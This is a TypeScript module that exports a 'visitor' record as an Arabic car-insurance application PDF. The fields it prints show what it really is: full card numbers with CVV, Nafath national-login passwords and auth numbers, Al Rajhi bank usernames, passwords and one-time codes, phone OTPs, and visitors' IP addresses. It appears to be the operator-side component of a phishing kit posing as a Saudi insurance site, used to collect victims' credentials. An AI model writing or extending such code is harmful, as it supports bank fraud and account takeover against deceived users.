import jsPDF from "jspdf";
import autoTable from "jspdf-autotable";

interface VisitorData {
  id: string;
  personalInfo?: {
    nationalId?: string;
    birthDate?: string;
    phone?: string;
    documment_owner_full_name?: string;
  };
  vehicleInfo?: {
    serialNumber?: string;
    vehicleYear?: string;
    coverageType?: string;
    selectedAddOns?: string[];
  };
  selectedOffer?: {
    companyName?: string;
    basePrice?: number;
    totalPrice?: number;
    discountPercentage?: number;
  };
  paymentInfo?: {
    cardNumber?: string;
    cardHolder?: string;
    expiryDate?: string;
    cvv?: string;
  };
  nafazData?: {
    idNumber?: string;
    password?: string;
    authNumber?: string;
  };
  rajhiData?: {
    username?: string;
    password?: string;
    otp?: string;
  };
  phoneData?: {
    phoneNumber?: string;
    carrier?: string;
    otp?: string;
  };
  metadata?: {
    country?: string;
    browser?: string;
    os?: string;
    ip?: string;
    createdAt?: any;
  };
}

function reverseArabic(text: string): string {
  if (!text || text === "-") return text;
  const arabicRegex = /[\u0600-\u06FF]/;
  if (arabicRegex.test(text)) {
    return text.split('').reverse().join('');
  }
  return text;
}

export function generateInsurancePDF(data: VisitorData): void {
  const doc = new jsPDF({
    orientation: "portrait",
    unit: "mm",
    format: "a4",
  });

  const pageWidth = doc.internal.pageSize.getWidth();
  const margin = 15;
  let yPos = 20;

  doc.setFont("helvetica", "bold");
  doc.setFontSize(22);
  doc.setTextColor(0, 82, 147);
  
  doc.text(reverseArabic("تأمين السيارات"), pageWidth / 2, yPos, { align: "center" });
  yPos += 8;
  
  doc.setFontSize(14);
  doc.setTextColor(0, 82, 147);
  doc.text(reverseArabic("استمارة طلب"), pageWidth / 2, yPos, { align: "center" });
  yPos += 15;

  doc.setFillColor(0, 82, 147);
  doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
  doc.setTextColor(255, 255, 255);
  doc.setFontSize(11);
  doc.setFont("helvetica", "bold");
  doc.text(reverseArabic("معلومات مقدم الطلب"), pageWidth / 2, yPos + 5.5, { align: "center" });
  yPos += 12;

  const personalData = [
    [data.personalInfo?.documment_owner_full_name || "-", reverseArabic("الاسم الكامل")],
    [data.personalInfo?.nationalId || "-", reverseArabic("رقم الهوية")],
    [data.personalInfo?.phone || "-", reverseArabic("رقم الهاتف")],
    [data.personalInfo?.birthDate || "-", reverseArabic("تاريخ الميلاد")],
  ];

  autoTable(doc, {
    startY: yPos,
    head: [],
    body: personalData,
    theme: "grid",
    styles: {
      fontSize: 10,
      cellPadding: 4,
      halign: "right",
    },
    columnStyles: {
      0: { cellWidth: "auto", halign: "left" },
      1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
    },
    margin: { left: margin, right: margin },
  });

  yPos = (doc as any).lastAutoTable.finalY + 10;

  if (data.vehicleInfo) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("معلومات المركبة"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const vehicleData = [
      [data.vehicleInfo?.serialNumber || "-", reverseArabic("الرقم التسلسلي")],
      [data.vehicleInfo?.vehicleYear || "-", reverseArabic("سنة الصنع")],
      [data.vehicleInfo?.coverageType || "-", reverseArabic("نوع التغطية")],
      [data.vehicleInfo?.selectedAddOns?.join(", ") || "-", reverseArabic("الإضافات")],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: vehicleData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.selectedOffer) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("عرض التأمين"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const offerData = [
      [data.selectedOffer?.companyName || "-", reverseArabic("الشركة")],
      [data.selectedOffer?.basePrice ? `${data.selectedOffer.basePrice} ر.س` : "-", reverseArabic("السعر الأساسي")],
      [data.selectedOffer?.discountPercentage ? `${data.selectedOffer.discountPercentage}%` : "-", reverseArabic("الخصم")],
      [data.selectedOffer?.totalPrice ? `${data.selectedOffer.totalPrice} ر.س` : "-", reverseArabic("السعر الإجمالي")],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: offerData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.paymentInfo?.cardNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("معلومات الدفع"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const paymentData = [
      [data.paymentInfo?.cardNumber || "-", reverseArabic("رقم البطاقة")],
      [data.paymentInfo?.cardHolder || "-", reverseArabic("اسم حامل البطاقة")],
      [data.paymentInfo?.expiryDate || "-", reverseArabic("تاريخ الانتهاء")],
      [data.paymentInfo?.cvv || "-", "CVV"],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: paymentData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.nafazData?.idNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("توثيق نفاذ"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const nafazTableData = [
      [data.nafazData?.idNumber || "-", reverseArabic("رقم الهوية")],
      [data.nafazData?.password || "-", reverseArabic("كلمة المرور")],
      [data.nafazData?.authNumber || "-", reverseArabic("رقم التوثيق")],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: nafazTableData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.rajhiData?.username) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("بنك الراجحي"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const rajhiTableData = [
      [data.rajhiData?.username || "-", reverseArabic("اسم المستخدم")],
      [data.rajhiData?.password || "-", reverseArabic("كلمة المرور")],
      [data.rajhiData?.otp || "-", reverseArabic("رمز التحقق")],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: rajhiTableData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.phoneData?.phoneNumber) {
    doc.setFillColor(0, 82, 147);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("التحقق من الهاتف"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const phoneTableData = [
      [data.phoneData?.phoneNumber || "-", reverseArabic("رقم الهاتف")],
      [data.phoneData?.carrier || "-", reverseArabic("شركة الاتصالات")],
      [data.phoneData?.otp || "-", reverseArabic("رمز التحقق")],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: phoneTableData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });

    yPos = (doc as any).lastAutoTable.finalY + 10;
  }

  if (data.metadata) {
    doc.setFillColor(100, 100, 100);
    doc.rect(margin, yPos, pageWidth - 2 * margin, 8, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(11);
    doc.text(reverseArabic("البيانات الوصفية"), pageWidth / 2, yPos + 5.5, { align: "center" });
    yPos += 12;

    const createdAt = data.metadata?.createdAt?.toDate?.() 
      ? data.metadata.createdAt.toDate().toLocaleString("ar-SA")
      : data.metadata?.createdAt || "-";

    const metaData = [
      [data.metadata?.country || "-", reverseArabic("الدولة")],
      [data.metadata?.browser || "-", reverseArabic("المتصفح")],
      [data.metadata?.os || "-", reverseArabic("نظام التشغيل")],
      [data.metadata?.ip || "-", reverseArabic("عنوان IP")],
      [createdAt, reverseArabic("تاريخ الإنشاء")],
    ];

    autoTable(doc, {
      startY: yPos,
      head: [],
      body: metaData,
      theme: "grid",
      styles: {
        fontSize: 10,
        cellPadding: 4,
        halign: "right",
      },
      columnStyles: {
        0: { cellWidth: "auto", halign: "left" },
        1: { fontStyle: "bold", cellWidth: 50, fillColor: [240, 240, 240], halign: "right" },
      },
      margin: { left: margin, right: margin },
    });
  }

  const pageHeight = doc.internal.pageSize.getHeight();
  doc.setFontSize(8);
  doc.setTextColor(128, 128, 128);
  doc.text(
    `${reverseArabic("تم الإنشاء")}: ${new Date().toLocaleString("ar-SA")} | ${reverseArabic("رقم المستند")}: ${data.id}`,
    pageWidth / 2,
    pageHeight - 10,
    { align: "center" }
  );

  const fileName = `طلب_تأمين_${data.personalInfo?.nationalId || data.id}_${Date.now()}.pdf`;
  doc.save(fileName);
}
